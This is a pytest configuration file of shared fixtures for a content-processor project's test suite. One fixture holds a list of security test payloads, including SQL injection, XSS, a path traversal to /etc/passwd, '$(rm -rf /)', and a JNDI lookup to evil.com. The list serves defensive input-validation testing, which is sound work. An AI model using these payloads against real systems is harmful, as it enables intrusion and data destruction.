"""
Core pytest configuration and shared fixtures for warp-content-processor tests.

This module provides common test fixtures, configurations, and utilities
that are shared across all test modules in the test suite.
"""

import os
import tempfile
from pathlib import Path
from typing import Dict, Any, Generator, List
import pytest
import yaml
from unittest.mock import Mock, patch


# Test Data Constants
TEST_DATA_DIR = Path(__file__).parent / "fixtures"
SAMPLE_YAML_CONTENT = """
workflows:
  - name: test-workflow
    steps:
      - name: step1
        run: echo "test"
"""

SAMPLE_NOTEBOOK_CONTENT = {
    "cells": [
        {
            "cell_type": "code",
            "execution_count": 1,
            "metadata": {},
            "outputs": [],
            "source": ["print('Hello, World!')"]
        }
    ],
    "metadata": {
        "kernelspec": {
            "display_name": "Python 3",
            "language": "python",
            "name": "python3"
        }
    },
    "nbformat": 4,
    "nbformat_minor": 4
}


@pytest.fixture(scope="session")
def test_data_dir() -> Path:
    """Return the path to the test data directory."""
    return TEST_DATA_DIR


@pytest.fixture(scope="session")
def temp_dir() -> Generator[Path, None, None]:
    """Create a temporary directory for test files."""
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def sample_yaml_content() -> str:
    """Return sample YAML content for testing."""
    return SAMPLE_YAML_CONTENT.strip()


@pytest.fixture
def sample_notebook_content() -> Dict[str, Any]:
    """Return sample notebook content for testing."""
    return SAMPLE_NOTEBOOK_CONTENT.copy()


@pytest.fixture
def mock_file_system(tmp_path: Path) -> Generator[Path, None, None]:
    """Create a mock file system structure for testing."""
    # Create test directory structure
    test_files = tmp_path / "test_files"
    test_files.mkdir()
    
    # Create sample files
    (test_files / "sample.yaml").write_text(SAMPLE_YAML_CONTENT)
    (test_files / "sample.yml").write_text(SAMPLE_YAML_CONTENT)
    (test_files / "empty.yaml").write_text("")
    (test_files / "invalid.yaml").write_text("invalid: yaml: content: [")
    
    # Create notebook file
    import json
    (test_files / "sample.ipynb").write_text(json.dumps(SAMPLE_NOTEBOOK_CONTENT))
    
    # Create text files
    (test_files / "sample.txt").write_text("Sample text content")
    (test_files / "readme.md").write_text("# Test README")
    
    yield test_files


@pytest.fixture
def yaml_test_data() -> Dict[str, Any]:
    """Return structured test data for YAML processing."""
    return {
        "valid_yaml": {
            "key": "value",
            "list": [1, 2, 3],
            "nested": {"inner": "value"}
        },
        "invalid_yaml": "invalid: yaml: content: [",
        "empty_yaml": "",
        "complex_yaml": {
            "workflows": [
                {
                    "name": "test-workflow",
                    "on": ["push", "pull_request"],
                    "jobs": {
                        "test": {
                            "runs-on": "ubuntu-latest",
                            "steps": [
                                {"name": "Checkout", "uses": "actions/checkout@v2"},
                                {"name": "Setup Python", "uses": "actions/setup-python@v2"}
                            ]
                        }
                    }
                }
            ]
        }
    }


@pytest.fixture
def mock_logger():
    """Create a mock logger for testing."""
    return Mock()


@pytest.fixture
def environment_variables() -> Generator[Dict[str, str], None, None]:
    """Manage environment variables for testing."""
    original_env = os.environ.copy()
    test_env = {
        "TEST_MODE": "true",
        "LOG_LEVEL": "DEBUG",
        "PYTEST_RUNNING": "true"
    }
    
    # Set test environment variables
    for key, value in test_env.items():
        os.environ[key] = value
    
    yield test_env
    
    # Restore original environment
    os.environ.clear()
    os.environ.update(original_env)


@pytest.fixture
def sample_file_contents() -> Dict[str, str]:
    """Return sample file contents for various file types."""
    return {
        "yaml": SAMPLE_YAML_CONTENT,
        "json": '{"key": "value", "list": [1, 2, 3]}',
        "text": "Sample text content for testing",
        "markdown": "# Test Markdown\n\nThis is a test markdown file.",
        "python": "def hello():\n    print('Hello, World!')",
        "empty": "",
        "binary": b"\\x00\\x01\\x02\\x03\\x04\\x05"
    }


@pytest.fixture
def validation_test_cases() -> List[Dict[str, Any]]:
    """Return test cases for validation testing."""
    return [
        {
            "name": "valid_basic",
            "data": {"key": "value"},
            "expected": True,
            "description": "Basic valid data"
        },
        {
            "name": "invalid_empty",
            "data": {},
            "expected": False,
            "description": "Empty data should be invalid"
        },
        {
            "name": "invalid_none",
            "data": None,
            "expected": False,
            "description": "None data should be invalid"
        },
        {
            "name": "valid_complex",
            "data": {
                "workflows": [
                    {"name": "test", "steps": [{"run": "echo test"}]}
                ]
            },
            "expected": True,
            "description": "Complex valid data structure"
        }
    ]


@pytest.fixture
def security_test_payloads() -> List[str]:
    """Return security test payloads for testing input validation."""
    return [
        "'; DROP TABLE users; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "$(rm -rf /)",
        "{{7*7}}",
        "${jndi:ldap://evil.com/exploit}",
        "eval(compile('print(1)', '', 'exec'))",
        "__import__('os').system('id')",
    ]


@pytest.fixture(autouse=True)
def setup_test_environment(environment_variables):
    """Automatically set up test environment for all tests."""
    # This fixture runs automatically for every test
    pass


@pytest.fixture
def mock_yaml_parser():
    """Create a mock YAML parser for testing."""
    mock_parser = Mock()
    mock_parser.parse.return_value = {"mocked": "data"}
    mock_parser.is_valid.return_value = True
    mock_parser.get_errors.return_value = []
    return mock_parser


@pytest.fixture
def processor_test_config() -> Dict[str, Any]:
    """Return configuration for processor testing."""
    return {
        "timeout": 30,
        "max_file_size": 1024 * 1024,  # 1MB
        "allowed_extensions": [".yaml", ".yml", ".json", ".md", ".txt"],
        "security_scan": True,
        "validation_rules": {
            "required_fields": ["name"],
            "max_depth": 10,
            "max_items": 100
        }
    }


# Test markers for different test categories
pytestmark = [
    pytest.mark.filterwarnings("ignore::DeprecationWarning"),
]


def pytest_configure(config):
    """Configure pytest with custom settings."""
    config.addinivalue_line(
        "markers", "smoke: mark test as a smoke test"
    )
    config.addinivalue_line(
        "markers", "integration: mark test as an integration test"
    )
    config.addinivalue_line(
        "markers", "unit: mark test as a unit test"
    )
    config.addinivalue_line(
        "markers", "slow: mark test as slow running"
    )
    config.addinivalue_line(
        "markers", "security: mark test as security related"
    )
    config.addinivalue_line(
        "markers", "performance: mark test as performance related"
    )


def pytest_collection_modifyitems(config, items):
    """Modify test collection to add markers based on test location."""
    for item in items:
        # Add unit marker to all tests by default
        if not any(mark.name in ["integration", "smoke", "performance"] for mark in item.iter_markers()):
            item.add_marker(pytest.mark.unit)
        
        # Add slow marker to tests that might be slow
        if "slow" in item.nodeid.lower() or "performance" in item.nodeid.lower():
            item.add_marker(pytest.mark.slow)
        
        # Add security marker to security tests
        if "security" in item.nodeid.lower() or "validation" in item.nodeid.lower():
            item.add_marker(pytest.mark.security)
